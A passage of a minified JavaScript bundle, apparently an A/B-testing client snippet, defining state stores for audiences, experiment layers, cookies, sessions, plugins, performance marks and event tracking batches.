            if (!i.isString(n)) {
              if (i.isObject(n)) {
                var e = n.type,
                  r = n.name || "_";
                t[e] || (t[e] = {}), t[e][r] = !0;
              }
              i.isArray(n) && a(n, t);
            }
          }), t) : t;
        }
        n.exports = {
          initialize: function () {
            this.X = {
              audiences: {},
              featuresNeeded: {}
            }, this.on(r.DATA_LOADED, this.vn);
          },
          vn: function (n) {
            i.isEmpty(n.data.audiences) || (i.each(n.data.audiences, i.bind(function (n) {
              o.deepFreeze(n), i.merge(this.X.featuresNeeded, a(n.conditions)), this.X.audiences[n.id] = n;
            }, this)), this.emitChange());
          },
          getAll: function () {
            return o.safeReference(i.values(this.X.audiences));
          },
          getFeaturesNeeded: function (n) {
            return o.safeReference(this.X.featuresNeeded[n] || {});
          },
          getAudiencesMap: function () {
            return o.safeReference(this.X.audiences);
          },
          get: function (n) {
            return o.safeReference(this.X.audiences[n]);
          },
          getAudienceName: function (n) {
            return i.find(i.values(this.X.audiences), {
              id: n
            }).name || "Aud " + n;
          }
        };
      },
      5065: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(3694);
        n.exports = {
          initialize: function () {
            this.X = {}, this.on(r.ADD_CHANGE, this.yn), this.on(r.DATA_LOADED, this.vn);
          },
          getChange: function (n) {
            return this.X[n];
          },
          vn: function (n) {
            i.isEmpty(n.data.changes) || i.each(n.data.changes, i.bind(this.yn, this));
          },
          yn: function (n) {
            o.deepFreeze(n), this.X[n.id] = n, this.emitChange();
          }
        };
      },
      1390: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(8964);
        n.exports = {
          initialize: function () {
            this.X = {}, i.each(o.Lifecycle, i.bind(function (n) {
              this.X[n] = [];
            }, this)), this.on(r.ADD_CLEANUP_FN, this.bn), this.on(r.CLEAR_CLEANUP_FN, this.En);
          },
          getCleanupFns: function (n) {
            return i.cloneDeep(this.X[n]);
          },
          bn: function (n) {
            this.X[n.lifecycle].push(n.cleanupFn), this.emitChange();
          },
          En: function (n) {
            var t = this.X[n.lifecycle];
            if (n.cleanupFn) {
              var e = t.indexOf(n.cleanupFn);
              e > -1 && (t.splice(e, 1), this.emitChange());
            } else this.X[n.lifecycle] = [], this.emitChange();
          }
        };
      },
      3642: function (n, t, e) {
        var i = e(2805),
          r = e(5172);
        n.exports = {
          initialize: function () {
            this.X = {
              name: r.NAME,
              version: r.VERSION
            }, this.on(i.SET_CLIENT_NAME, this.In), this.on(i.SET_CLIENT_VERSION, this.An);
          },
          getClientName: function () {
            return this.X.name;
          },
          getClientVersion: function () {
            return this.X.version;
          },
          In: function (n) {
            n && (this.X.name = n), this.emitChange();
          },
          An: function (n) {
            n && (this.X.version = n), this.emitChange();
          }
        };
      },
      9381: function (n, t, e) {
        var i = e(2805);
        n.exports = {
          initialize: function () {
            this.X = {
              currentDomain: null,
              defaultAgeSeconds: 15552e3,
              autoRefresh: true
            }, this.on(i.SET_COOKIE_DOMAIN, this.Tn), this.on(i.SET_COOKIE_AGE, this.Sn), this.on(i.SET_COOKIE_AUTO_REFRESH, this.kn);
          },
          getCurrentDomain: function () {
            return this.X.currentDomain;
          },
          getDefaultAgeInSeconds: function () {
            return this.X.defaultAgeSeconds;
          },
          getAutoRefresh: function () {
            return this.X.autoRefresh;
          },
          Tn: function (n) {
            this.X.currentDomain = n, this.emitChange();
          },
          Sn: function (n) {
            this.X.defaultAgeSeconds = n, this.emitChange();
          },
          kn: function (n) {
            this.X.autoRefresh = n, this.emitChange();
          }
        };
      },
      4253: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(3694);
        n.exports = {
          initialize: function () {
            this.X = {}, this.on(r.DATA_LOADED, this.vn);
          },
          vn: function (n) {
            i.isEmpty(n.data.dimensions) || (i.each(n.data.dimensions, i.bind(function (n) {
              o.deepFreeze(n), this.X[n.id] = n;
            }, this)), this.emitChange());
          },
          getAll: function () {
            return o.safeReference(i.values(this.X));
          },
          getById: function (n) {
            return o.safeReference(this.X[n]);
          },
          getByApiName: function (n) {
            return o.safeReference(i.find(i.values(this.X), {
              apiName: n
            }));
          }
        };
      },
      4710: function (n, t, e) {
        var i = e(9576),
          r = e(2805);
        n.exports = {
          initialize: function () {
            this.X = {
              disabled: !1,
              forceAudienceIds: [],
              forceVariationIds: [],
              alreadyInitialized: !1,
              mutationObserverAPISupported: !1,
              isEditor: !1,
              isPreview: !1,
              isLegacyPreview: !1,
              isSlave: !1,
              previewLayerIds: [],
              projectToken: null,
              shouldOptOut: !1,
              trackingDisabled: !1,
              isRunningInV2Editor: !1,
              isRunningInDesktopApp: !1,
              forceTracking: !1
            }, this.on(r.LOAD_DIRECTIVE, this.Rn);
          },
          getAll: function () {
            return i.cloneDeep(this.X);
          },
          conflictInObservingChanges: function () {
            return !this.X.mutationObserverAPISupported;
          },
          isDisabled: function () {
            return this.X.disabled;
          },
          isEditor: function () {
            return this.X.isEditor;
          },
          clientHasAlreadyInitialized: function () {
            return this.X.alreadyInitialized;
          },
          getForceAudienceIds: function () {
            return this.X.forceAudienceIds;
          },
          getForceVariationIds: function () {
            return this.X.forceVariationIds;
          },
          getPreviewLayerIds: function () {
            return this.X.previewLayerIds;
          },
          getProjectToken: function () {
            return this.X.projectToken;
          },
          getForceTracking: function () {
            return this.X.forceTracking;
          },
          shouldActivate: function () {
            return !this.X.isEditor && !this.isDisabled();
          },
          shouldBootstrapDataForPreview: function () {
            return this.X.isPreview;
          },
          shouldBootstrapDataForEditor: function () {
            return this.X.isEditor;
          },
          shouldInitialize: function () {
            return !(this.shouldLoadPreview() || this.isDisabled() || this.getProjectToken());
          },
          shouldLoadPreview: function () {
            return !(this.X.isPreview || this.X.isLegacyPreview || !this.getProjectToken() || this.X.isEditor);
          },
          shouldBailForDesktopApp: function () {
            return !this.X.isEditor && this.X.isRunningInDesktopApp;
          },
          shouldLoadInnie: function () {
            return !this.X.isSlave && !this.X.isEditor && this.X.isRunningInV2Editor;
          },
          shouldObserveChangesIndefinitely: function () {
            return this.X.mutationObserverAPISupported;
          },
          shouldObserveChangesUntilTimeout: function () {
            return !this.shouldObserveChangesIndefinitely();
          },
          shouldOptOut: function () {
            return this.X.shouldOptOut;
          },
          shouldSendTrackingData: function () {
            return !this.X.trackingDisabled && (!!this.X.forceTracking || !this.X.isPreview && i.isEmpty(this.getForceVariationIds()) && i.isEmpty(this.getForceAudienceIds()));
          },
          isSlave: function () {
            return this.X.isSlave;
          },
          isRunningInDesktopApp: function () {
            return this.X.isRunningInDesktopApp;
          },
          isRunningInV2Editor: function () {
            return this.X.isRunningInV2Editor;
          },
          Rn: function (n) {
            i.extend(this.X, n), this.emitChange();
          }
        };
      },
      9610: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(3694);
        n.exports = {
          initialize: function () {
            this.X = {}, this.on(r.DATA_LOADED, this.vn);
          },
          getAll: function () {
            return o.safeReference(i.values(this.X));
          },
          getEventsMap: function () {
            return o.safeReference(this.X);
          },
          get: function (n) {
            return o.safeReference(this.X[n]);
          },
          getByApiName: function (n) {
            return o.safeReference(i.find(i.values(this.X), {
              apiName: n
            }));
          },
          getByPageId: function (n) {
            return o.safeReference(i.filter(this.X, {
              pageId: n
            }));
          },
          vn: function (n) {
            i.isEmpty(n.data.events) || (i.each(n.data.events, i.bind(function (n) {
              n.pageId || (n.pageId = n.viewId), o.deepFreeze(n), this.X[n.id] = n;
            }, this)), this.emitChange());
          }
        };
      },
      1592: function (n, t, e) {
        var i = e(9576),
          r = e(2805);
        function o(n) {
          var t = [];
          return n && i.isObject(n) ? (n.type && t.push(n.type), t.push("|"), n.type && n.name && t.push(n.name), t.join("")) : "|";
        }
        n.exports = {
          initialize: function () {
            this.X = {
              handlers: {}
            }, this.on(r.ADD_EMITTER_HANDLER, this.Nn), this.on(r.REMOVE_EMITTER_HANDLER, this.Dn);
          },
          getHandlers: function (n, t) {
            var e = [null, {
                type: n.type
              }, {
                type: n.type,
                name: n.name
              }],
              r = [];
            return i.each(e, i.bind(function (n) {
              var t = o(n),
                e = this.X.handlers[t];
              e && (r = r.concat(e));
            }, this)), t && (r = i.filter(r, function (n) {
              return !n.publicOnly;
            })), r;
          },
          Nn: function (n) {
            var t = o(n.filter);
            this.X.handlers[t] || (this.X.handlers[t] = []), this.X.handlers[t].push({
              handler: n.handler,
              token: n.token,
              publicOnly: !!n.publicOnly,
              emitErrors: !!n.emitErrors
            }), this.emitChange();
          },
          Dn: function (n) {
            var t = !1,
              e = n.token;
            i.forOwn(this.X.handlers, i.bind(function (n, r) {
              var o = i.filter(n, function (n) {
                return n.token !== e;
              });
              o.length !== n.length && (t = !0, this.X.handlers[r] = o);
            }, this)), t && this.emitChange();
          }
        };
      },
      1312: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(3694);
        n.exports = {
          initialize: function () {
            this.X = {
              holdback: 0,
              isGlobalHoldback: null,
              listTargetingKeys: [],
              revision: null,
              projectId: null,
              accountId: null,
              namespace: null,
              activationId: null,
              activationTimestamp: null,
              dcpServiceId: null,
              dcpKeyfieldLocators: [],
              recommenderServices: [],
              anonymizeIP: null,
              projectJS: null,
              snippetId: null,
              plugins: [],
              domContentLoaded: !1,
              experimental: {}
            }, this.on(r.DATA_LOADED, this.Cn), this.on(r.ACTIVATE, this.On), this.on(r.RECORD_GLOBAL_DECISION, this.xn), this.on(r.SET_DOMCONTENTLOADED, this.Pn);
          },
          getRevision: function () {
            return this.X.revision;
          },
          getGlobalHoldbackThreshold: function () {
            return this.X.holdback;
          },
          getProjectId: function () {
            return this.X.projectId;
          },
          getSnippetId: function () {
            return this.X.snippetId;
          },
          getAccountId: function () {
            return this.X.accountId;
          },
          getNamespace: function () {
            return this.X.namespace;
          },
          getActivationId: function () {
            return this.X.activationId;
          },
          getActivationTimestamp: function () {
            return this.X.activationTimestamp;
          },
          getAnonymizeIP: function () {
            return this.X.anonymizeIP;
          },
          isGlobalHoldback: function () {
            return !!this.X.isGlobalHoldback;
          },
          getListTargetingKeys: function () {
            return this.X.listTargetingKeys.slice();
          },
          getDCPServiceId: function () {
            return this.X.dcpServiceId;
          },
          getDCPKeyfieldLocators: function () {
            return this.X.dcpKeyfieldLocators;
          },
          getRecommenderServices: function () {
            return this.X.recommenderServices;
          },
          getProjectJS: function () {
            return this.X.projectJS;
          },
          getPlugins: function () {
            return this.X.plugins;
          },
          getExperimental: function () {
            return o.safeReference(this.X.experimental);
          },
          domContentLoadedHasFired: function () {
            return this.X.domContentLoaded;
          },
          On: function (n) {
            this.X.activationId = n.activationId, this.X.activationTimestamp = n.activationTimestamp, this.X.isGlobalHoldback = null;
          },
          xn: function (n) {
            var t = n.isGlobalHoldback;
            if (null !== this.X.isGlobalHoldback && this.X.isGlobalHoldback !== t) throw new Error("Attempted to change already set global holdback!");
            this.X.isGlobalHoldback = t, this.emitChange();
          },
          Cn: function (n) {
            var t = i.pick(n.data, ["holdback", "accountId", "projectId", "snippetId", "namespace", "revision", "listTargetingKeys", "dcpServiceId", "dcpKeyfieldLocators", "recommenderServices", "anonymizeIP", "plugins", "projectJS", "experimental"]);
            if (0 !== i.keys(t).length) {
              i.extend(this.X, {
                listTargetingKeys: [],
                dcpServiceId: null,
                dcpKeyfieldLocators: []
              }, t), this.emitChange();
            }
          },
          Pn: function () {
            this.X.domContentLoaded = !0, this.emitChange();
          }
        };
      },
      3881: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(3694);
        n.exports = {
          initialize: function () {
            this.X = {}, this.on(r.DATA_LOADED, this.vn);
          },
          vn: function (n) {
            i.isEmpty(n.data.groups) || (i.each(n.data.groups, i.bind(function (n) {
              o.deepFreeze(n), this.X[n.id] = n;
            }, this)), this.emitChange());
          },
          getAll: function () {
            return o.safeReference(i.values(this.X));
          },
          getGroupsMap: function () {
            return o.safeReference(this.X);
          },
          get: function (n) {
            return o.safeReference(this.X[n]);
          }
        };
      },
      6662: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(2188);
        n.exports = {
          initialize: function () {
            this.X = {
              originalPushState: null,
              originalReplaceState: null
            }, this.on(r.ENSURE_ORIGINAL_PUSHSTATE, this.Mn), this.on(r.ENSURE_ORIGINAL_REPLACESTATE, this.Ln);
          },
          getOriginalPushState: function () {
            return this.X.originalPushState;
          },
          getOriginalReplaceState: function () {
            return this.X.originalReplaceState;
          },
          Mn: function () {
            this.X.originalPushState || (this.X.originalPushState = i.bind(o.getGlobal("history").pushState, o.getGlobal("history")));
          },
          Ln: function () {
            this.X.originalReplaceState || (this.X.originalReplaceState = i.bind(o.getGlobal("history").replaceState, o.getGlobal("history")));
          }
        };
      },
      9935: function (n, t, e) {
        var i = e(9576),
          r = e(2805);
        n.exports = {
          initialize: function () {
            this.X = {}, this.on(r.DATA_LOADED, this.vn), this.on(r.SET_INTEGRATION_SETTINGS, this.Vn);
          },
          vn: function (n) {
            i.isEmpty(n.data.integrationSettings) || (i.each(n.data.integrationSettings, i.bind(function (n) {
              this.X[n.id] = n;
            }, this)), this.emitChange());
          },
          Vn: function (n) {
            var t = this.X[n.id];
            t ? i.extend(t, n) : this.X[n.id] = n;
          },
          getAll: function () {
            return i.cloneDeep(i.values(this.X));
          },
          get: function (n) {
            return i.cloneDeep(this.X[n]);
          },
          getReference: function (n) {
            return this.X[n];
          }
        };
      },
      1037: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(2678),
          a = "*";
        n.exports = {
          initialize: function () {
            this.X = {}, this.on(r.LOAD_PERSISTED_LAYER_STATES, this.Fn), this.on(r.RECORD_LAYER_DECISION, this.Un), this.on(r.RECORD_LAYER_DECISION_EVENT_ID, this.zn);
          },
          getLayerState: function (n, t) {
            if (this.X[n]) {
              var e = this.X[n];
              if (i.keys(e).length > 1 && !t) throw new Error("View Id must be specified when more than one layerState for layer.");
              return t ? i.cloneDeep(i.find(e, {
                pageId: t
              })) : i.cloneDeep(e["*"]);
            }
          },
          getLayerStates: function (n) {
            var t = [];
            for (var e in this.X) i.forEach(this.X[e], function (e) {
              (i.isUndefined(n) || e.namespace === n) && t.push(i.cloneDeep(e));
            });
            return t;
          },
          getLayerStatesForAnalytics: function () {
            var n = [];
            for (var t in this.X) i.forEach(this.X[t], function (t) {
              n.push(i.pick(t, ["layerId", "decision", "decisionEventId"]));
            });
            return n;
          },
          Fn: function (n) {
            n.merge || (this.X = {}), i.each(n.layerStates, i.bind(function (n) {
              var t = n.layerId;
              n.pageId || (n.pageId = n.viewId);
              var e = n.pageId || a,
                r = this.X[t];
              if (i.isUndefined(r)) this.X[t] = {}, this.X[t][e] = n;else {
                var o = r[e];
                (!o || n.decisionTimestamp > (o.decisionTimestamp || 0)) && (this.X[t][e] = n);
              }
            }, this)), this.emitChange();
          },
          Un: function (n) {
            var t = {
                layerId: n.layerId,
                revision: n.revision,
                namespace: n.namespace,
                pageId: n.pageId,
                decisionTicket: n.decisionTicket,
                decision: n.decision,
                decisionActivationId: n.activationId,
                decisionTimestamp: n.timestamp,
                decisionEventId: null
              },
              e = this.X[n.layerId] || {};
            n.pageId ? (delete e["*"], e[n.pageId] = t) : (e = {})["*"] = t, this.X[n.layerId] = e, this.emitChange();
          },
          zn: function (n) {
            var t = n.layerId,
              e = n.pageId || a;
            this.X[t] ? this.X[t][e] ? (this.X[t][e].decisionEventId = n.decisionId, this.emitChange()) : o.warn("Not recording decision event: Layer state not found for view", e) : o.warn("Not recording decision event: Campaign not registered", t);
          }
        };
      },
      8336: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(3694),
          a = e(2119);
        n.exports = {
          initialize: function () {
            this.X = {
              layers: {},
              experiments: {},
              variations: {}
            }, this.on(r.DATA_LOADED, this.vn);
          },
          vn: function (n) {
            if (!i.isEmpty(n.data.layers)) {
              var t = this;
              i.each(n.data.layers, function (n) {
                i.each(n.experiments, function (e) {
                  n.pageIds || (n.pageIds = n.viewIds), e.campaignName || a.isSingleExperimentPolicy(n.policy) ? a.isSingleExperimentPolicy(n.policy) && n.groupId && (e.groupId = n.groupId) : e.campaignName = n.name, i.each(e.variations, function (n) {
                    i.each(n.actions, function (n) {
                      n.pageId || (n.pageId = n.viewId);
                    }), t.X.variations[n.id] = n;
                  }), t.X.experiments[e.id] = e;
                }), o.deepFreeze(n), t.X.layers[n.id] = n;
              }), this.emitChange();
            }
          },
          getAll: function () {
            return o.safeReference(i.values(this.X.layers));
          },
          getCampaignsMap: function () {
            return o.safeReference(this.X.layers);
          },
          getExperimentsMap: function () {
            return o.safeReference(this.X.experiments);
          },
          getVariationsMap: function () {
            return o.safeReference(this.X.variations);
          },
          getCount: function () {
            return i.keys(this.X.layers).length;
          },
          getAllByPageIds: function (n) {
            return o.safeReference(i.filter(this.X.layers, function (t) {
              return i.some(n, i.partial(i.includes, t.pageIds));
            }));
          },
          get: function (n) {
            return o.safeReference(this.X.layers[n]);
          },
          getLayerByExperimentId: function (n) {
            var t = i.find(this.X.layers, function (t) {
              return i.find(t.experiments, {
                id: n
              });
            });
            return o.safeReference(t);
          },
          getExperimentByVariationId: function (n) {
            var t;
            return i.some(this.X.layers, function (e) {
              return i.some(e.experiments, function (e) {
                return i.find(e.variations, {
                  id: n
                }) && (t = e), t;
              }), t;
            }), o.safeReference(t);
          }
        };
      },
      8842: function (n, t, e) {
        var i = e(2805);
        n.exports = {
          initialize: function () {
            this.X = {
              logs: []
            }, this.on(i.LOG, this.jn);
          },
          getLogs: function () {
            return this.X.logs;
          },
          jn: function (n) {
            this.X.logs.push(n), this.emitChange();
          },
          Z: function () {
            return this.X.logs.slice();
          }
        };
      },
      8648: function (n, t, e) {
        var i = e(2805),
          r = e(3694);
        n.exports = {
          initialize: function () {
            this.X = {
              data: null,
              hasTracked: null
            }, this.on(i.LOAD_REDIRECT_DATA, this.Gn), this.on(i.REGISTER_TRACKED_REDIRECT_DATA, this.Bn);
          },
          get: function () {
            return r.safeReference(this.X.data);
          },
          hasTracked: function () {
            return this.X.hasTracked;
          },
          Gn: function (n) {
            r.deepFreeze(n), this.X.data = n, this.X.hasTracked = !1, this.emitChange();
          },
          Bn: function () {
            this.X.hasTracked = !0;
          }
        };
      },
      9990: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(2676);
        n.exports = {
          initialize: function () {
            this.X = {}, this.on(r.SET_PENDING_EVENT, this.qn), this.on(r.REMOVE_PENDING_EVENT, this.Hn), this.on(r.LOAD_PENDING_EVENTS, this.Yn);
          },
          getEvents: function () {
            return this.X;
          },
          getEventsString: function () {
            return o.stringify(this.X);
          },
          qn: function (n) {
            i.keys(this.X).length >= 1e3 && this.Kn();
            var t = n.id,
              e = n.retryCount;
            this.X[t] && this.X[t].retryCount === e || (this.X[t] = {
              id: t,
              timeStamp: n.timeStamp,
              data: n.data,
              retryCount: e
            }, this.emitChange());
          },
          Hn: function (n) {
            delete this.X[n.id], this.emitChange();
          },
          Yn: function (n) {
            this.X = n.events, this.Kn(), this.emitChange();
          },
          Kn: function () {
            for (var n = i.sortBy(this.X, "timeStamp"), t = 0; t <= n.length - 1e3; t++) delete this.X[n[t].id];
            this.emitChange();
          }
        };
      },
      9441: function (n, t, e) {
        var i = e(9576),
          r = e(2805);
        n.exports = {
          initialize: function () {
            this.X = {
              layerId: null
            }, this.on(r.ANNOUNCE_PENDING_REDIRECT, this.Gn);
          },
          isExpectingRedirect: function () {
            return i.isString(this.X.layerId);
          },
          getLayerId: function () {
            return this.X.layerId;
          },
          Gn: function (n) {
            this.isExpectingRedirect() || (this.X.layerId = n.layerId, this.emitChange());
          }
        };
      },
      1053: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(8964);
        n.exports = {
          initialize: function () {
            this.X = {}, this.X[o.PerformanceData.performance_marks] = {}, this.on(r.SET_PERFORMANCE_MARKS_DATA, this.$n);
          },
          $n: function (n) {
            i.isUndefined(this.X[o.PerformanceData.performance_marks][n.name]) && (this.X[o.PerformanceData.performance_marks][n.name] = []), this.X[o.PerformanceData.performance_marks][n.name].push(n.data), this.emitChange();
          },
          getMarks: function () {
            return i.mapValues(this.X[o.PerformanceData.performance_marks], function (n) {
              return i.map(n, function (n) {
                return [n.startTime, n.duration];
              });
            });
          },
          getDurationsFor: function (n) {
            return i.reduce(n, i.bind(function (n, t) {
              var e = this.X[o.PerformanceData.performance_marks][t];
              return e && (n[t] = Math.round(i.reduce(e, function (n, t) {
                return n + t.duration;
              }, 0))), n;
            }, this), {});
          }
        };
      },
      4808: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(8964),
          a = e(2678);
        n.exports = {
          initialize: function () {
            this.X = i.mapValues(o.PluginTypes, function () {
              return {};
            }), this.on(r.REGISTER_PLUGIN, this.Wn);
          },
          Wn: function (n) {
            var t = n.type,
              e = n.name,
              i = n.plugin;
            if (!t || !e) throw new Error("Missing information needed to register plugins: " + t + ":" + e);
            if (!this.X[t]) throw new Error("Invalid plugin type specified: " + t);
            this.X[t][e] = i, a.debug("Plugin Store: Registering Plugin :", n);
          },
          getAllPlugins: function (n) {
            if (!n) return this.X;
            if (this.X[n]) return this.X[n];
            throw new Error("Invalid plugin type: " + n);
          },
          getPlugin: function (n, t) {
            if (!t || !n) throw new Error("Missing plugin parameters");
            return this.getAllPlugins(n)[t] || null;
          }
        };
      },
      6743: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(9196);
        n.exports = {
          initialize: function () {
            this.X = {}, this.on(r.SET_VISITOR_ATTRIBUTE_PENDING, this.Xn);
          },
          getPendingAttributeValue: function (n) {
            return n = i.isArray(n) ? n.concat("pending") : [n, "pending"], o.getFieldValue(this.X, n);
          },
          Xn: function (n) {
            o.setFieldValue(this.X, n.key, {
              pending: n.pending
            }), this.emitChange();
          }
        };
      },
      1349: function (n, t, e) {
        var i = e(9576),
          r = e(2805);
        n.exports = {
          initialize: function () {
            this.X = {
              inRumSample: !1,
              id: null,
              src: null,
              RumHost: null,
              data: {
                extras: {}
              },
              apis: {},
              DOMObservation: {},
              featuresNeeded: {}
            }, this.on(r.SET_RUM_DATA, this.Jn), this.on(r.RECORD_API_USAGE, this.Qn), this.on(r.INITIALIZE_CHANGE_METRICS, this.Zn), this.on(r.RECORD_ACTIVATION_TYPE_USAGE, this.nt), this.on(r.RECORD_AUDIENCE_USAGE, this.tt), this.on(r.RECORD_CHANGE_MACROTASK_RATE, this.et), this.on(r.RECORD_CHANGE_OVERHEATED, this.it), this.on(r.RECORD_CHANGE_TYPE_USAGE, this.rt), this.on(r.RECORD_DOM_OBSERVATION_OCCURENCE, this.ot), this.on(r.RECORD_INTEGRATION_USAGE, this.ut), this.on(r.RECORD_LAYER_FEATURE_USAGE, this.ct), this.on(r.RECORD_LAYER_POLICY_USAGE, this.st), this.on(r.RECORD_VIEW_FEATURE_USAGE, this.ft), this.on(r.RECORD_VIEWS_INITIALLY_ACTIVATED_COUNT, this.dt), this.on(r.RECORD_VISITOR_ID_LOCATOR_USAGE, this.vt), this.on(r.RECORD_VISITOR_ID_ERROR, this.ht), this.on(r.RECORD_STICKY_BUCKETING_FEATURE, this._t);
          },
          Jn: function (n) {
            i.merge(this.X, n), this.emitChange();
          },
          Qn: function (n) {
            this.X.apis[n.methodName] || (this.X.apis[n.methodName] = 0), this.X.apis[n.methodName]++, this.emitChange();
          },
          Zn: function () {
            i.isUndefined(this.X.data.extras.changeMacrotaskRate) && (this.X.data.extras.changeMacrotaskRate = 0), i.isUndefined(this.X.data.extras.numOverheatedChanges) && (this.X.data.extras.numOverheatedChanges = 0);
          },
          et: function (n) {
            i.isUndefined(this.X.data.extras.changeMacrotaskRate) && (this.X.data.extras.changeMacrotaskRate = 0), n.changeMacrotaskRate > this.X.data.extras.changeMacrotaskRate && (this.X.data.extras.changeMacrotaskRate = n.changeMacrotaskRate), this.emitChange();
          },
          it: function () {
            i.isUndefined(this.X.data.extras.numOverheatedChanges) && (this.X.data.extras.numOverheatedChanges = 0), this.X.data.extras.numOverheatedChanges++, this.emitChange();
          },
          ot: function (n) {
            this.X.DOMObservation[n.counterName] || (this.X.DOMObservation[n.counterName] = 0), this.X.DOMObservation[n.counterName]++, this.emitChange();
          },
          wt: function (n, t, e) {
            i.isUndefined(this.X.featuresNeeded[n]) && (this.X.featuresNeeded[n] = {});
            var r = this.X.featuresNeeded[n];
            i.each(t, function (n) {
              r[n] || (r[n] = {}), r[n][e] || (r[n][e] = !0);
            });
          },
          ut: function (n) {
            this.wt("integrations", n.integrations, n.layerId);
          },
          rt: function (n) {
            this.wt("changeTypes", n.changeTypes, n.layerId);
          },
          nt: function (n) {
            this.wt("activationTypes", [n.activationType], n.entityId), this.emitChange();
          },
          ft: function (n) {
            this.wt("viewFeatures", n.featuresUsed, n.entityId), this.emitChange();
          },
          ct: function (n) {
            this.wt("layerFeatures", [n.feature], n.entityId), this.emitChange();
          },
          st: function (n) {
            this.wt("policy", [n.policy], n.layerId), this.emitChange();
          },
          tt: function (n) {
            this.wt("audiences", n.audienceTypes, n.layerId), this.emitChange();
          },
          dt: function (n) {
            this.X.data.extras.viewsInitiallyActivatedCount = n.viewsInitiallyActivatedCount, this.emitChange();
          },
          vt: function (n) {
            this.wt("visitorIdLocatorType", [n.visitorIdLocatorType], n.entityId), this.emitChange();
          },
          ht: function (n) {
            this.X.data.extras.errorCustomVisitorId = n.isError, this.emitChange();
          },
          _t: function (n) {
            this.wt("stickyBucketing", [n.feature], n.id);
          },
          getSampleRum: function () {
            return this.X.inRumSample;
          },
          getRumId: function () {
            return this.X.id;
          },
          getRumHost: function () {
            return this.X.RumHost;
          },
          getApiData: function () {
            return this.X.apis;
          },
          getDOMObservationData: function () {
            return this.X.DOMObservation;
          },
          getRumData: function () {
            return i.cloneDeep(this.X.data);
          },
          getScriptSrc: function () {
            return this.X.src;
          },
          getFeaturesNeededData: function () {
            var n = this.X.featuresNeeded,
              t = {};
            return i.forOwn(n, function (n, e) {
              var r = i.keys(n);
              i.isEmpty(r) || (t[e] = {}), i.forEach(r, function (r) {
                t[e][r] = i.keys(n[r]).length;
              });
            }), t;
          }
        };
      },
      8654: function (n, t, e) {
        var i = e(2805);
        n.exports = {
          initialize: function () {
            this.X = {
              initialized: !1,
              natives: {}
            }, this.on(i.SANDBOXED_FUNCTIONS_ADDED, this.yt);
          },
          yt: function (n) {
            if (!n.sandboxedFunctions) throw new Error("No sandboxedFunctions found in payload");
            this.X.natives = n.sandboxedFunctions, this.X.initialized = !0, this.emitChange();
          },
          getAll: function () {
            return this.X.natives;
          },
          get: function (n) {
            if (!n) throw new Error("Missing name parameter");
            return this.X.natives[n] || null;
          },
          isInitialized: function () {
            return this.X.initialized;
          }
        };
      },
      2043: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(3792),
          a = e(1243);
        n.exports = {
          initialize: function () {
            this.X = {
              lastSessionTimestamp: 0,
              sessionId: null
            }, this.on(r.REFRESH_SESSION, this.bt), this.on(r.LOAD_SESSION_STATE, this.Et);
          },
          getState: function () {
            return i.cloneDeep(this.X);
          },
          getSessionId: function () {
            return this.X.sessionId;
          },
          Et: function (n) {
            this.X.sessionId = n.sessionId, this.X.lastSessionTimestamp = n.lastSessionTimestamp, this.emitChange();
          },
          bt: function () {
            var n = o.now(),
              t = this.X.lastSessionTimestamp;
            (!this.X.sessionId || n - t > 18e5) && (this.X.sessionId = a.generate()), this.X.lastSessionTimestamp = n, this.emitChange();
          }
        };
      },
      3697: function (n, t, e) {
        var i = e(9576),
          r = e(2805);
        n.exports = {
          initialize: function () {
            this.It(), this.on(r.FINALIZE_BATCH_SNAPSHOT, this.At), this.on(r.REGISTER_PREVIOUS_BATCH, this.Tt), this.on(r.REGISTER_TRACKER_VISITOR, this.St), this.on(r.REGISTER_TRACKER_EVENT, this.kt), this.on(r.REGISTER_TRACKER_DECISION, this.Rt), this.on(r.RESET_TRACKER_EVENTS, this.Nt), this.on(r.RESET_TRACKER_STORE, this.It), this.on(r.RESET_TRACKER_PREVIOUS_BATCHES, this.Dt), this.on(r.SET_TRACKER_POLLING, this.Ct), this.on(r.SET_TRACKER_BATCHING, this.Ot), this.on(r.SET_TRACKER_SEND_EVENTS, this.xt), this.on(r.SET_TRACKER_PERSISTABLE_STATE, this.Pt), this.on(r.SET_TRACKER_DIRTY, this.Mt), this.on(r.UPDATE_TRACKER_VISITOR_ATTRIBUTES, this.Lt);
          },
          getPersistableState: function () {
            return this.X.isDirty ? this.hasEventsToSend() || this.hasPreviousBatchesToSend() ? {
              data: this.X.data,
              decisions: this.X.decisions,
              decisionEvents: this.X.decisionEvents,
              previousBatches: this.X.previousBatches
            } : {} : null;
          },
          Pt: function (n) {
            i.isEmpty(this.X.data) || i.isEmpty(n.data) || (this.At(), this.X.previousBatches.push(this.getEventBatch())), this.X.data = n.data || {}, this.X.decisions = n.decisions || [], this.X.decisionEvents = n.decisionEvents || [], i.isEmpty(this.X.previousBatches) || i.isEmpty(n.previousBatches) ? this.X.previousBatches = n.previousBatches || [] : this.X.previousBatches = this.X.previousBatches.concat(n.previousBatches), this.emitChange();
          },
          Mt: function (n) {
            this.X.isDirty = n, this.emitChange();
          },
          kt: function (n) {
            var t = this.Vt();
            (i.isEmpty(t.snapshots) || !i.isEmpty(this.X.decisionEvents)) && this.Ft(), this.Ut().events.push(n.event), this.X.decisions = n.decisions, this.Mt(!0);
          },
          Rt: function (n) {
            this.X.decisionEvents.push(n.decisionEvent), this.X.decisions = n.decisions, this.Mt(!0);
          },
          St: function (n) {
            i.isEmpty(this.X.data) ? this.X.data = n.data : this.At(), this.X.data.visitors.push(n.visitor), this.X.decisions = n.decisions, this.X.decisionEvents = [], this.Mt(!0);
          },
          Tt: function (n) {
            this.X.previousBatches.push(n), this.Mt(!0);
          },
